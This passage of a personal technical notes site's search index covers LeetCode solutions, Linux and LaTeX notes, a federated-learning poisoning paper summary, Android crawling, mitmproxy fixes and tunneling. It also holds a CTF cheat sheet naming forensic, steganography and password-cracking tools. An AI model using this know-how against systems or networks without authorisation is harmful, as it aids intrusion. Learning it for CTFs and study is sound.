nums = [3,3], target = 6 Output: [0,1] ::: 簡單來說就是回傳一個list，包含兩個element，也就是原本nums的index位置，對應的兩個數值相會等於target，就這樣，不過他給的test case算蠻佛心的，可以更完善原本沒有想到的exception\nPoC # 重要的事情是list變數不能直接assign，因為記憶體是一樣的，詳細可以參考1，之前就有發生過這個問題，這次是詳細的閱讀底層的說明，另外我覺得我有一點把poc弄得太複雜了，畢竟要考慮的東西頗多，就先不管一些complexity的optimization\nclass Solution: def twoSum(self, nums: list[int], target: int) -\u0026gt; list[int]: result = [] tmp_list = list(nums) for i in range(len(nums)): tmp_list.pop(0) if (target - nums[i]) in tmp_list: result.append(i) result.append(self.find(nums, target, i)) return result else: pass def find(self, nums, target, j): for i in range(j+1, len(nums)): if target - nums[i] == nums[j]: return i else: pass Result # 看來還有很多進步的空間，不過就先這樣ㄅ\nReference # [Python] 關於變數與參考的二三事 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":160,"href":"/leetcode/easy/leetcode---valid-parentheses/","title":"LeetCode - Valid Parentheses","section":"LeetCodes","content":" LeetCode - Valid Parentheses # Recon \u0026amp; Description # :::spoiler Description Given a string s containing just the characters \u0026lsquo;(\u0026rsquo;, \u0026lsquo;)\u0026rsquo;, \u0026lsquo;{\u0026rsquo;, \u0026lsquo;}\u0026rsquo;, \u0026lsquo;[\u0026rsquo; and \u0026lsquo;]\u0026rsquo;, determine if the input string is valid.\nAn input string is valid if:\nOpen brackets must be closed by the same type of brackets. Open brackets must be closed in the correct order. Every close bracket has a corresponding open bracket of the same type. Example 1:\nInput: s = \u0026#34;()\u0026#34; Output: true Example 2:\nInput: s = \u0026#34;()[]{}\u0026#34; Output: true Example 3:\nInput: s = \u0026#34;(]\u0026#34; Output: false ::: 這一題非常簡單，就只是分辨輸入進來的括號有沒有符合使用的設定，也就是正確的配對小中大括號彼此對應這樣，一開始用了第一種方法(付在下面)發現coverage很低，所以就想第二種方法比較符合正確的實作，所以分數也比較高\nPoC # right_brackets = [\u0026#39;(\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;{\u0026#39;] left_brackets = [\u0026#39;)\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;}\u0026#39;] brackets_dic = {\u0026#34;(\u0026#34;:0, \u0026#34;)\u0026#34;:0, \u0026#39;[\u0026#39;:1, \u0026#39;]\u0026#39;:1, \u0026#39;{\u0026#39;:2, \u0026#39;}\u0026#39;:2} class Solution: def isValid(self, s: str) -\u0026gt; bool: right = [] left = [] brackets_stack = [] first_situation = 0 second_situation = 0 if len(s) % 2 != 0: return False \u0026#39;\u0026#39;\u0026#39;################ Method 2 ################\u0026#39;\u0026#39;\u0026#39; for i in range(len(s)): if s[i] in right_brackets: brackets_stack.append(s[i]) continue else: try: if brackets_dic[s[i]] == brackets_dic[brackets_stack[-1]]: brackets_stack.pop() continue else: return False except: return False if brackets_stack == []: return True else: return False result = Solution() test_case = [\u0026#34;){\u0026#34;, \u0026#34;()\u0026#34;, \u0026#34;()[]{}\u0026#34;, \u0026#34;(]\u0026#34;, \u0026#34;{[]}\u0026#34;, \u0026#34;([)]\u0026#34;] print(result.isValid(test_case[0])) :::spoiler Method 1\nright_brackets = [\u0026#39;(\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;{\u0026#39;] left_brackets = [\u0026#39;)\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;}\u0026#39;] brackets_dic = {\u0026#34;(\u0026#34;:0, \u0026#34;)\u0026#34;:0, \u0026#39;[\u0026#39;:1, \u0026#39;]\u0026#39;:1, \u0026#39;{\u0026#39;:2, \u0026#39;}\u0026#39;:2} class Solution: def isValid(self, s: str) -\u0026gt; bool: right = [] left = [] first_situation = 0 second_situation = 0 if len(s) % 2 != 0: return False \u0026#39;\u0026#39;\u0026#39;################ Method 1 ################\u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\u0026#39; for i in range(len(s)): if s[i] in right_brackets: right.append(s[i]) continue if s[i] in left_brackets: left.append(s[i]) continue if len(right) != len(left): return False else: for i in range(len(left)): if brackets_dic[right[i]] == brackets_dic[left[i]]: first_situation += 1 pass elif brackets_dic[right[i]] == brackets_dic[left[len(left) - i - 1]]: second_situation += 1 else: return False if first_situation == len(left) or second_situation == len(left): return True else: return False \u0026#39;\u0026#39;\u0026#39; :::\nResult # "},{"id":161,"href":"/terminology/linux-related/","title":"Linux Related","section":"Terminologies","content":" What is .so file? 資料來源: 在Linux中.so和.a檔有什麼差別？\n副檔名為“ .so”的檔案是dynamically linked shared object libraries，簡稱為shared objects、shared libraries或shared object libraries。Shared object libraries在執行時動態載入。Shared object libraries並不是應用程式的一部分，但它們在編譯過程中必須可用取用。一般來說，shared object libraries類似於Windows電腦上的DLL檔。 舉例來說，NI-VISA驅動程式就是使用Shared object libraries。\nx86、x86_64/x64、amd64和arm64/aarch64 資料來源: 【CPU】關於x86、x86_64/x64、amd64和arm64/aarch64\n==x86=i386=IA32==: 是指intel的開發的一種32位指令集，從386開始時代開始的，一直沿用至今，是一種cisc指令集，所有intel早期的cpu，amd早期的cpu都支持這種指令集，intel官方文檔里面稱為“IA-32” ==x86_64=x64=AMD64==: 是x86 CPU開始邁向64位的时候 ==ARM==: （英文為Advanced RISC Machine，或Acorn RISC Machine）也是一個架構，非常適用於移動通信這種低成本，高性能，低耗電的領域。 ==AArch64=ARM64==: 是ARMv8的一種執行狀態。為了更廣泛地向企業領域推進，需要引入 64 位構架，同時也需要在 ARMv8 架構中引入新的 AArch64 執行狀態。AArch64 不是一個單純的 32 位 ARM 構架擴展，而是 ARMv8 內全新的構架，完全使用全新的 A64 指令集。 Linux 0, 1, 2, 2\u0026gt;\u0026amp;1 資料來源: Linux 裡的文件描述符 0，1，2， 2＞\u0026amp;1 究竟是什麼\n/dev/null 表示空設備文件 0 表示stdin標準輸入 1 表示stdout標準輸出 2 表示stderr標準錯誤\n2\u0026gt;1和2\u0026gt;\u0026amp;1的寫法有什麽區別： 2\u0026gt;1的作用是把標準錯誤的輸出重定向到1，但這個1不是標準輸出，而是一個文件!!!,文件名就是1 2\u0026gt;\u0026amp;1的作用是把標準錯誤的輸出重定向到標準輸出1，\u0026amp;指示不要把1當作普通文件，而是fd=1即標準輸出來處理。 command\u0026gt;a 2\u0026gt;a 與 command\u0026gt;a 2\u0026gt;\u0026amp;1的區別 通過上面的分析，對於command\u0026gt;a 2\u0026gt;\u0026amp;1這條命令，等價於command 1\u0026gt;a 2\u0026gt;\u0026amp;1可以理解為執行 command 產生的標準輸入重定向到文件 a 中，標準錯誤也重定向到文件 a 中。那麽是否就說command 1\u0026gt;a 2\u0026gt;\u0026amp;1等價於command 1\u0026gt;a 2\u0026gt;a呢。其實不是，command 1\u0026gt;a 2\u0026gt;\u0026amp;1與command 1\u0026gt;a 2\u0026gt;a還是有區別的，區別就在於前者只打開一次文件a，後者會打開文件兩次，並導致 stdout 被 stderr 覆蓋。\u0026amp;1的含義就可以理解為用標準輸出的引用，引用的就是重定向標準輸出產生打開的 a。從IO效率上來講，command 1\u0026gt;a 2\u0026gt;\u0026amp;1比command 1\u0026gt;a 2\u0026gt;a的效率更高 為何2\u0026gt;\u0026amp;1要寫在後面？ index.php task testOne \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 我們可以理解為，左邊是標準輸出，好，現在標準輸出直接輸入到/dev/null中，而2\u0026gt;\u0026amp;1是將標準錯誤重定向到標準輸出，所以當程序產生錯誤的時候，相當於錯誤流向左邊，而左邊依舊是輸入到/dev/null中。 可以理解為，如果寫在中間，那會把隔斷標準輸出指定輸出的文件 "},{"id":162,"href":"/survey-papers/federated-learning/local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes/","title":"Local Model Poisoning Attacks to Byzantine-Robust Federated Learning - Notes","section":"Survey Papers","content":" Local Model Poisoning Attacks to Byzantine-Robust Federated Learning - Notes # tags: Meeting Paper NTU # :::info Fang, M., Cao, X., Jia, J., \u0026amp; Gong, N. (2020). Local model poisoning attacks to {Byzantine-Robust} federated learning. In 29th USENIX security symposium (USENIX Security 20) (pp. 1605-1622). :::\nBackground # What is Non-IID? # 首先：什麽是獨立同分布？\n同分布：所有items均來自同一種概率分布； e.g. 你丟骰子，每次丟骰子到任何一個數字的概率都是1/6，是相等概率。或者說，在概率空間里面，你不論進行幾次抽樣實驗，他們都服從同樣一個分布。 獨立：這些sample items全部都是獨立事件； e.g. 每次抽樣之間沒有關系，不會相互影響。比如你在隨便丟骰子，每次拋到的數字是幾就是幾，是獨立的。但如果我要求你要兩次拋到的數字和大於等於9，第一次和第二次拋就不獨立，因為他們相互關聯。 非獨立：有些數據處理的順序不夠隨機。比如有些按時間和其他一些標準來排序的數據會出現相關的情況，違反非獨立的原則。 非同分布：數據因所處在不同的分區而出現不同的分布。 Non-IID其實有三種：不獨立但同分布，獨立不同分布，不獨立也不同分布。 實用拜占庭容錯機制理解 # 拜占庭將軍問題是一個協議問題，拜占庭帝國軍隊的將軍們必須全體一致的決定是否攻擊某一支敵軍。問題是這些將軍在地理上是分隔開來的，並且將軍中存在叛徒。叛徒可以任意行動以達到以下目標：欺騙某些將軍采取進攻行動；促成一個不是所有將軍都同意的決定，如當將軍們不希望進攻時促成進攻行動；或者迷惑某些將軍，使他們無法做出決定。如果叛徒達到了這些目的之一，則任何攻擊行動的結果都是注定要失敗的，只有完全達成一致的努力才能獲得勝利。\n這一問題是一種對現實世界的模型化，尤指網絡當中由於軟硬件錯誤、網絡阻塞及惡意攻擊導致的各種未知行為。\n拜占庭容錯 # 拜占庭將軍問題提出後，有很多的算法被提出用於解決這個問題。這類算法統稱拜占庭容錯算法（BFT: Byzantine Fault Tolerance）。簡略來說，拜占庭容錯（BFT）不是某一個具體算法，而是能夠抵抗拜占庭將軍問題導致的一系列失利的系統特點。 這意味著即使某些節點出現缺點或惡意行為，拜占庭容錯系統也能夠繼續運轉。本質上來說，拜占庭容錯方案就是少數服從多數。\n拜占庭容錯系統需要達成如下兩個指標： # 安全性：任何已經完成的請求都不會被更改，它可以在以後請求看到。在區塊鏈系統中，可以理解為，已經生成的賬本不可篡改，並且可以被節點隨時查看。 活性：可以接受並且執行非拜占庭客戶端的請求，不會被任何因素影響而導致非拜占庭客戶端的請求不能執行。在區塊鏈系統中，可以理解為，系統需要持續生成區塊，為用戶記賬，這主要靠挖礦的激勵機制來保證。 Aggregation Rules # Krum Algorithm # Krum算法原理 # Krum算法的核心思想是在每輪訓練結束後，對參與者的本地模型權重進行一種特殊的排序和選擇。具體來說，Krum算法遵循以下步驟：\n計算模型權重之間的距離：對於每對參與者i和j，計算其本地模型權重向量之間的歐氏距離。 計算每個參與者的距離和：一共有n個參與者，對於每個參與者i，假設有f個攻擊者，計算參與者與其他最近的n-f-1個參與者模型權重之間的距離和。 選擇距離和最小的模型：在所有參與者中，找到距離和最小的模型作為聚合模型。 通過這種方法，Krum算法能夠在參與者之間建立一種“共識”，過濾掉可能受到惡意攻擊的異常模型權重，從而保護全局模型的魯棒性。\nKrum算法的應用場景 # Krum算法適用於以下場景：\n需要保護用戶隱私的聯邦學習場景：例如，在醫療、金融等領域，數據隱私和安全性至關重要。 面臨拜占庭攻擊風險的聯邦學習場景：例如，在IoT（物聯網）設備、自動駕駛汽車等分布式系統中，由於通信不穩定、設備故障或惡意攻擊，可能存在傳輸錯誤或篡改的模型權重。 Krum算法的優勢與不足 # 優勢：\n魯棒性：Krum算法可以抵禦一定數量的拜占庭攻擊者，保證全局模型的魯棒性。 適用性廣泛：Krum算法可以應用於各種類型的聯邦學習場景，包括橫向聯邦學習、縱向聯邦學習等。 不足：\n計算覆雜度較高：Krum算法需要計算每對參與者之間的距離，計算覆雜度為O(n^2)，其中n為參與者數量。在參與者數量較多的情況下，計算負擔可能較重。 通信開銷較大：Krum算法需要在參與者之間傳輸模型權重和距離信息，可能導致較大的通信開銷。在網絡帶寬有限或通信不穩定的環境中，可能影響聯邦學習的效率。 Trimmed Mean # Trimmed mean：m個模型的第j 個參數，拋棄最大的和最小的參數，選取剩余的參數的平均值作為全局參數。\nMedian # Median：主設備對本地模型的第j個參數進行排序，並將中值作為全局模型的第j個參數。\n"},{"id":163,"href":"/security/course/ntu-ml/machine-learning-hand-write-homework--answer/","title":"Machine Learning Hand-write Homework \u0026 Answer","section":"Securities","content":" Machine Learning Hand-write Homework \u0026amp; Answer # tags: NTU_ML Machine Learning # HW1 HW1-Ans HW2 HW2-Ans HW3 HW3-Ans HW4 HW4-Ans "},{"id":164,"href":"/terminology/math-related/","title":"Math Related","section":"Terminologies","content":" Math Related # 數學字母使用規則 # 在 LaTeX 中，數學符號（如 \\mathscr, \\mathbb, \\mathcal）通常有特定的用途和限制，主要在於 哪些類型的變數或集合適合使用哪種格式。以下是一些常見的數學字母風格以及它們的用途：\n1. \\mathcal (Calligraphic) # 用途：\n用來表示 集合、空間、拓撲結構、代數結構等 例如：機率論的 \\mathcal{F}（σ-代數）、拓撲空間 \\mathcal{T} 示例：\n\\mathcal{P}, \\mathcal{L}, \\mathcal{M}, \\mathcal{N} 顯示為： $$ \\mathcal{P}, \\mathcal{L}, \\mathcal{M}, \\mathcal{N} $$\n適用範圍： ✅ 集合、拓撲、機率論、幾何學 ❌ 變數、數值、矩陣\n2. \\mathbb (Blackboard Bold) # 用途：\n用於表示 數域、特殊集合，例如 實數、整數、複數等 常見於線性代數、數論、分析等 示例：\n\\mathbb{R}, \\mathbb{Z}, \\mathbb{Q}, \\mathbb{C} 顯示為： $$ \\mathbb{R}, \\mathbb{Z}, \\mathbb{Q}, \\mathbb{C} $$\n適用範圍： ✅ 數域、特定的集合（例如 \\mathbb{N} 代表自然數） ❌ 一般變數、函數名稱\n3. \\mathscr (Script Font) # 用途：\n一般用於表示 泛函分析、測度論、概率論等的特定集合 有時也用來表示物理學中的拉格朗日量 (\\mathscr{L})、哈密頓量 (\\mathscr{H}) 示例：\n\\mathscr{F}, \\mathscr{L}, \\mathscr{M} 顯示為： $$ \\mathscr{F}, \\mathscr{L}, \\mathscr{M} $$\n適用範圍： ✅ 泛函分析、測度論、物理學的特殊符號 ❌ 數域、一般集合\n4. \\mathrm (Roman Font) # 用途：\n讓變數顯示為正常文字（直立羅馬體） 常用於數學公式中的標籤、單位、常數 例如 \\mathrm{d}x（積分中的微分）、\\mathrm{mod}（模運算） 示例：\n\\mathrm{sin}, \\mathrm{mod}, \\mathrm{kg} 顯示為： $$ \\mathrm{sin}, \\mathrm{mod}, \\mathrm{kg} $$\n適用範圍： ✅ 物理單位、數學操作符、標籤 ❌ 變數、集合\n5. \\mathbf (Bold) # 用途：\n用於表示向量或矩陣（特別是物理學、線性代數） 例如：\\mathbf{A} 表示矩陣 A，\\mathbf{v} 表示向量 示例：\n\\mathbf{A}, \\mathbf{x}, \\mathbf{F} 顯示為： $$ \\mathbf{A}, \\mathbf{x}, \\mathbf{F} $$\n適用範圍： ✅ 矩陣、向量 ❌ 一般變數、集合\n6. \\mathfrak (Fraktur) # 用途：\n用於 群論、抽象代數、微分幾何 例如：李代數中的 \\mathfrak{g}（g 表示李代數） 示例：\n\\mathfrak{g}, \\mathfrak{h}, \\mathfrak{so}, \\mathfrak{su} 顯示為： $$ \\mathfrak{g}, \\mathfrak{h}, \\mathfrak{so}, \\mathfrak{su} $$\n適用範圍： ✅ 抽象代數、李代數 ❌ 數域、一般變數\n結論：不同符號的適用場合 # 符號 用途 \\mathcal{A} 集合、拓撲、機率空間 \\mathbb{R} 數域（實數、複數、整數） \\mathscr{L} 泛函分析、測度論、物理學 \\mathrm{d}x 單位、標籤、運算符 \\mathbf{A} 向量、矩陣 \\mathfrak{g} 抽象代數、李代數 你有特定的數學式想要確定使用哪種標記嗎？\n箭頭符號使用規則 # 數學中的箭頭符號在不同的上下文中有不同的使用方式，通常用來表示函數、映射、極限、推導等關係。以下是一些常見的箭頭符號及其用途：\n1. 基本函數與映射 # 符號 含義 例子 $f: A \\to B$ 函數 $f$ 將集合 $A$ 映射到集合 $B$ $f: \\mathbb{R} \\to \\mathbb{R}$ 表示 $f$ 是從實數到實數的函數 $x \\mapsto f(x)$ 表示 $x$ 映射到 $f(x)$ $x \\mapsto x^2$ 表示 $x$ 被映射到 $x^2$ $A \\hookrightarrow B$ 單射 (Injective mapping)，即每個 $A$ 的元素有唯一對應的 $B$ 元素 $\\mathbb{N} \\hookrightarrow \\mathbb{Z}$ 表示自然數嵌入到整數 $A \\twoheadrightarrow B$ 滿射 (Surjective mapping)，即 $B$ 的每個元素至少有一個 $A$ 中的對應元素 $\\mathbb{R} \\twoheadrightarrow \\mathbb{R}$ 表示一個滿射函數 $A \\xrightarrow{\\sim} B$ 雙射 (Bijection, 同構)，表示 $A$ 和 $B$ 之間的雙射關係 $\\mathbb{R}^+ \\xrightarrow{\\sim} (0,1)$ 表示這兩個集合是雙射的 2. 極限與趨勢 # 符號 含義 例子 $x \\to a$ $x$ 趨於 $a$ $x \\to 0$ $x \\to \\infty$ $x$ 趨於無窮大 $x^2 \\to \\infty$ 當 $x \\to \\infty$ $\\lim\\limits_{x \\to a} f(x)$ $x$ 趨近於 $a$ 時的函數極限 $\\lim\\limits_{x \\to 0} \\frac{\\sin x}{x} = 1$ $\\lim\\limits_{n \\to \\infty} a_n$ 無窮級數或序列的極限 $\\lim\\limits_{n \\to \\infty} \\frac{1}{n} = 0$ 3. 推導與邏輯關係 # 符號 含義 例子 $A \\Rightarrow B$ 蘊含 (Implication)，若 $A$ 成立，則 $B$ 必成立 若 $x \u0026gt; 2$，則 $x^2 \u0026gt; 4$ $A \\Leftrightarrow B$ 雙向蘊含 (If and only if, \u0026ldquo;iff\u0026rdquo;)，$A$ 和 $B$ 互為充要條件 $x \\text{ 為偶數} \\Leftrightarrow x \\text{ 可被 2 整除}$ $A \\rightarrow B$ 邏輯推導 (與 $\\Rightarrow$ 類似) $p \\rightarrow q$ 表示 $p$ 推導出 $q$ 4. 類別論與集合論 # 符號 含義 例子 $A \\to B$ 一般映射 $\\mathbb{N} \\to \\mathbb{R}$ $A \\Rightarrow B$ 邏輯蘊含 $P \\Rightarrow Q$ $A \\xrightarrow{f} B$ 類別論中的映射 $X \\xrightarrow{\\text{proj}_1} X \\times Y$ $A \\overset{f}{\\to} B$ 帶標記的映射 $f: A \\to B$ 5. 特殊應用 # 符號 含義 例子 $A \\rightrightarrows B$ 多值映射 $f: X \\rightrightarrows Y$ 表示一個關係映射 $A \\dashrightarrow B$ 局部定義映射 $\\mathbb{P}^2 \\dashrightarrow \\mathbb{P}^1$ $A \\longrightarrow B$ 加強版本的 $\\to$ $\\mathbb{R} \\longrightarrow \\mathbb{R}$ 總結 # 不同的箭頭符號適用於不同的數學領域，如映射、邏輯、極限等。一般來說：\n$\\to$ 和 $\\mapsto$ 用於函數 $\\Rightarrow, \\Leftrightarrow$ 用於邏輯推導 $\\xrightarrow{f}$ 用於標記映射 $\\hookrightarrow, \\twoheadrightarrow, \\xrightarrow{\\sim}$ 用於描述函數性質 你是想應用在哪個數學領域呢？\n"},{"id":165,"href":"/tools/others/android-app-crawler/maxim/","title":"Maxim","section":"Tools","content":" Maxim # 原本的repo README就說明的很清楚了\nHow to use # Environment 適用Emulator/Physical Android Version 7, 8, 9, 10, 11，但再往上就會遇到下面的問題 待測的App需要先安裝 Push File to Mobile $ adb push framework.jar /sdcard $ adb push monkey.jar /sdcard Command $ adb shell CLASSPATH=/sdcard/monkey.jar:/sdcard/framework.jar exec app_process /system/bin tv.panda.test.monkey.Monkey -p \u0026lt;app package name\u0026gt; --uiautomatormix --running-minutes 1 -v -v Mode: --uiautomatormix, --uiautomatordfs, --uiautomatortroy -p: 需要更改成待測app的package name --running-minutes: 設定要跑多久 Problem # [Maxim] *** ERROR // CRASH: com.xueqiu.android (pid 6940) [Maxim] *** ERROR // Short Msg: java.lang.UnsatisfiedLinkError [Maxim] *** ERROR // Long Msg: java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2) [Maxim] *** ERROR // Build Label: google/sdk_gphone64_x86_64/emulator64_x86_64_arm64:12/SE1A.211212.001.B1/8023802:user/release-keys [Maxim] *** ERROR // Build Changelist: 8023802 [Maxim] *** ERROR // Build Time: 1640217878000 [Maxim] *** ERROR // java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2) // at s.h.e.l.l.N.al(Native Method) // at s.h.e.l.l.A.instantiateApplication(Unknown Source:45) // at android.app.Instrumentation.newApplication(Instrumentation.java:1177) // at android.app.LoadedApk.makeApplication(LoadedApk.java:1356) // at android.app.ActivityThread.handleBindApplication(ActivityThread.java:6686) // at android.app.ActivityThread.access$1500(ActivityThread.java:247) // at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2053) // at android.os.Handler.dispatchMessage(Handler.java:106) // at android.os.Looper.loopOnce(Looper.java:201) // at android.os.Looper.loop(Looper.java:288) // at android.app.ActivityThread.main(ActivityThread.java:7839) // at java.lang.reflect.Method.invoke(Native Method) // at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548) // at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003) // "},{"id":166,"href":"/tools/ctf/misc-cheat-sheet/","title":"Misc Cheat Sheet","section":"Tools","content":" Misc Cheat Sheet # Online Tools # Encode \u0026amp; Decode Free Online Barcode Reader QR Code Barcode Reader Online Encoding 獸語 Check file info # $ binwalk [-e] [filename] # or binwalk --dd=\u0026#34;.*\u0026#34; [filename] $ exiftool [filename] $ pngcheck [filename] $ stat [filename] $ file [filename] $ binwalk -e 的範例可以參考Deadface - Electric Steel Steganography # text: zsteg(just for bmp and png files), Quick Crypto file: steghide(sudo apt-get install steghide)($ steghide extract -sf atbash.jpg) 進階的steghide$\\to$stegseek $ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb $ sudo apt install ./stegseek_0.6-1.deb -y $ stegseek [stegofile.jpg] [wordlist.txt] Disk Analysis # Foremost: 針對所支援的檔案結構去進行資料搜尋與救援 $ foremost -v {filename} Sleuth kit/Autopsy FTK Imager Logontracer: Just use GUI to present event log traced on windows $ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost Memory Forensics # 建議直接使用windown protable version會比較穩定而且不需要處理環境的問題 Volatility - Cheat Sheet Volatility 3 :::spoiler Set up \u0026amp; How2Use Windows Volatility 3 Problems \u0026amp; Solutions Windows Set up Tutorials $ git clone https://github.com/volatilityfoundation/volatility3 $ cd volatility3 $ pip install -r requirement.txt $ python vol.py -f \u0026lt;path to memory image\u0026gt; plugin_name plugin_option $ python vol.py -h # For help ::: Volatility 2 :::spoiler Set up \u0026amp; How2Use Windows Set up Tutorials $ conda create --name py27 python=2.7 $ conda activate py27 $ git clone https://github.com/volatilityfoundation/volatility $ cd volatility $ pip install pycrypto $ pip install distorm3 $ python vol.py -f \u0026lt;path to memory image\u0026gt; plugin_name plugin_option $ python vol.py -h # For help ::: Package # Wireshark cheat sheet nmap: $ sudo apt-get install nmap ntpdc $ sudo apt-get install ntpdc tcpflow $ sudo tcpflow -r {pcap file} Brute Force Password # for WPA/Wifi based: aircrack-ng, Wifite for system user: John the Ripper Sound # hide files: MP3stego $ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3 $ ./decode -X -P pass svega_stego.mp3 sound to image: How to convert a SSTV audio file to images using QSSTV - en How to convert a SSTV audio file to images using QSSTV - zh-cn hide message: silenteye Mail # PST Viewer eml Viewer ThunderBird Client Overall # All stego decrypt tools All stego encrypt tools ctf tool Other people\u0026rsquo;s note "},{"id":167,"href":"/problem-solutions/mitmproxy%E7%9B%B8%E9%97%9C%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/","title":"MITMProxy相關問題整理","section":"Problem Solutions","content":" MITMProxy相關問題整理 # 資料來源: https://github.com/mitmproxy/mitmproxy/issues/5442\nServer TLS handshake failed. The remote server does not speak TLS. # 代表連線的標的無法處理https的scheme，如果確定連線的目標是開在localhost或是一定是http scheme的話，可以利用script去hook流量把https改掉\nfrom mitmproxy import http def request(flow: http.HTTPFlow) -\u0026gt; None: # 檢查請求是否是 HTTPS if flow.request.scheme == \u0026#34;https\u0026#34;: # 將 URL 中的 HTTPS 替換為 HTTP flow.request.url = flow.request.url.replace(\u0026#39;https://\u0026#39;, \u0026#39;http://\u0026#39;) Unable to establish TLS connection with server (The remote server does not speak TLS.). Trying to establish TLS with client anyway. If you plan to redirect requests away from this server, consider setting connection_strategy to lazy to suppress early connections. # 出現這個warning，\n"},{"id":168,"href":"/terminology/network-related/","title":"Network Related","section":"Terminologies","content":" What is HTTP/SSH Tunnel, TLS/SSL, WebSocket? # 在讀When TLS Meets Proxy on Mobile1這篇paper的時候一直提到這些觀念，有時候會差點搞混中間的意思\nSSL Tunnel # 根據SSH Tunneling (Port Forwarding) 詳解 的說明:\nTunneling 指的是將網路上的 A、B 兩個端點用某種方式連接起來，形成一個「隧道」，讓兩端的通訊能夠穿透某些限制（例如防火牆），或是能將通訊內容加密避免洩漏。而 SSH Tunneling 就是指利用 SSH 協定來建立這個隧道 ![](https://johnliu55.tw/ssh-tunnel/images/tunneling.png =400x)\n有分成以下三種，以下接取自2的說明，但不特別解釋，原文也有補充很多實際如何使用的Command和教學\nLocal Port Forwarding 使用情境一：連到位在防火牆後的開發伺服器上的服務 ![](https://johnliu55.tw/ssh-tunnel/images/local_scenario1_problem.png =400x) ![](https://johnliu55.tw/ssh-tunnel/images/local_scenario1_solved.png =400x) 使用情境二：透過防火牆後的機器，連到防火牆後的特定服務 ![](https://johnliu55.tw/ssh-tunnel/images/local_scenario2_problem.png =400x) ![](https://johnliu55.tw/ssh-tunnel/images/local_scenario2_solved.png =400x) Remote Port Forwarding 使用情境一：透過對外機器，讓其他人能夠連到你的電腦上的服務 ![](https://johnliu55.tw/ssh-tunnel/images/remote_scenario1_problem.png =400x) ![](https://johnliu55.tw/ssh-tunnel/images/remote_scenario1_solved.png =400x) 使用情境二：透過對外機器，從外面連回內部網路上的服務 ![](https://johnliu55.tw/ssh-tunnel/images/remote_scenario2_problem.png =400x) ![](https://johnliu55.tw/ssh-tunnel/images/remote_scenario2_solved.png =400x) Dynamic Port Forwarding 使用情境：建立一個 HTTP 代理伺服器連到內網的所有 HTTP(S) 服務 ![](https://johnliu55.tw/ssh-tunnel/images/dynamic.png =400x) HTTP Tunnel # 根據http tunnel 原理及穿透防火牆方法中提到的說明，其實和上述的SSH Tunnel的原理和功能差不多，只是建立tunnel的Port變成HTTP的80為主\n舉例如下: A 主機系統在防火牆之後，受防火牆保護。防火牆配置的訪問控制原則是只允許80端口的數據進出，屏蔽了其他的所有端口。B主機系統在防火牆之外，是開放的。現在假設需要從A 系統Telnet到B系統上去，怎麽辦？ 使用正常的Telnet肯定是不可能了，但我們知道可用的只有80端口，那麽這個時候使用http Tunnel，就是一個好的辦法。思路如下: 在A 機器上運行一個Tunnel 的Client端，讓它偵聽本機的一個不被使用的任意指定端口(Port\u0026gt;1024 and port \u0026lt; 65535)，如1234. 同時將來自1234端口上的數據導向到遠端(B機)的80端口上(注意，是80端口，防火牆允許通過)，然後在B機上運行一個tunnel Server，同樣在80端口上監聽，然後把80 端口上接收到的數據(數據由tunnel client傳來)轉到本機的Telnet 服務端口23，這樣就ok了。\n根據剛才的設置, 數據流程大概是:\n[telnet.exe:任意端口]→[tunnel client.exe:1234]→[Firewall]→[tunnel server.exe:80]→[telnet Server.exe:23]\nTLS/SSL # 簡答 # 參考資料：https://www.digicert.com/tw/what-is-ssl-tls-and-https\nSSL是一種用於保護網際網路連線的標準技術，保護方法是對在網站和瀏覽器（或兩個伺服器之間）之間寄送的資料進行加密。它能防止駭客查看或竊取傳輸的任何訊息，包括個人或財務資料。 TLS是SSL的經過更新的、更安全的版本。我們仍將自己的安全性憑證稱為SSL，因為它是一個更通用的術語，但是當您從DigiCert購買憑證時，您將獲得最受信任的、最新的TLS憑證。 當網站受到SSL/TLS憑證的保護時，HTTPS會出現在URL中。使用者可以透過按一下瀏覽器網址列中的掛鎖標示來檢視憑證的詳細訊息，包括頒發機構和網站擁有者的公司名稱。 詳答 # 什麼是 SSL/TLS 憑證？\nSSL/TLS 憑證是一種數位物件，允許系統驗證身分並隨後使用 Secure Sockets Layer/Transport Layer Security (SSL/TLS) 協定，與另一個系統建立加密網路連線。憑證是在稱為公開金鑰基礎設施 (PKI) 的加密系統內使用。如果雙方都信任第三方 (稱為憑證授權單位)，PKI 會使用憑證讓其中一方建立另一方的身分。因此，SSL/TLS 憑證可作為數位身份證，用於保護網路通訊安全，以及為網際網路上的網站和私有網路上的資源建立身分。\nWebSocket # 根據WebSocket 基本介紹及使用筆記的說明如下:\n如果只在意這是什麼的話，那只要注意上半部就可以了，他和傳統的HTTP協定差異如下，HTTP協定必須要一來一回互相傳遞資料，但WebSocket只需要Handshake一次就可以開始互相主動傳遞資料，是HTML5提供的一種新的網路傳輸協定: ![](https://i.imgur.com/S3Mhxau.png =400x)\n參考資料：https://hackmd.io/@Heidi-Liu/javascript-websocket\nSocket # 